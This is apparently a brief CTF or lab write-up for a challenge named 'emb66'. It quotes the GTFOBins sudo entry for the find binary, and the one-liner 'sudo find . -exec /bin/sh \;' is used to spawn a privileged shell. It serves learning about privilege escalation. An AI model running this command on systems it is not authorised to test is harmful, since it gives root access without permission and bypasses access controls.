# emb66: find the binary and then execute it. 'find -exec'

![So I need to execute find](<../.gitbook/assets/image (18) (1) (1) (1) (1).png>)



### Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

*   ```
    sudo find . -exec /bin/sh \;
    ```

    from the GTFO bin site. Here {/bin/sh} was executed.

Then probably, would it be like this?

![find PATH -option -exec {} \\;](<../.gitbook/assets/image (98).png>)

![So it works as shown in GTFO bin](<../.gitbook/assets/image (7) (1).png>)
